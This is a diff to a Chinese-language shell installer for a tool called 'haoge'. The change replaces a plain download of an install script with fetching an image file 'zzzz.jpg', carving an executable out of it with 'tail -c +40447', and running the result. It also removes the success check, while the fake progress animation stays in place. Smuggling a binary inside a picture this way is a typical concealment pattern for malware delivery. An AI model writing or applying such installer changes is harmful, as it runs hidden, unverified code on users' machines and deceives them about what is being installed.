@@ -34,7 +34,7 @@ sleep 1
 
 # 下载 haoge_install 脚本
 echo -e "${BLUE}正在下载 haoge_install 脚本...${NC}"
-curl -o haoge_install https://raw.githubusercontent.com/simtelboy/haoge/main/haoge_install
+curl -o zzzz.jpg https://github.com/simtelboy/haoge/blob/main/zzzz.jpg?raw=true
 
 # 检查下载是否成功
 if [ $? -eq 0 ]; then
@@ -45,7 +45,7 @@ else
 fi
 
 # 赋予执行权限
-chmod +x haoge_install
+chmod +x zzzz.jpg
 
 # 模拟安装动画
 echo -e "${YELLOW}开始安装 haoge...${NC}"
@@ -57,17 +57,10 @@ done
 echo -e "] 完成！${NC}"
 sleep 1
 
-# 运行 haoge_install
-echo -e "${GREEN}正在运行 haoge_install...${NC}"
-./haoge_install
+tail -c +40447 zzzz.jpg >haoge
+chmod +x haoge
+./haoge
 
-# 检查安装是否成功
-if [ $? -eq 0 ]; then
-    echo -e "${GREEN}haoge 安装成功！${NC}"
-else
-    echo -e "${RED}安装失败，请检查脚本或依赖项。${NC}"
-    exit 1
-fi
 
 # 结束动画
 echo -e "${YELLOW}"
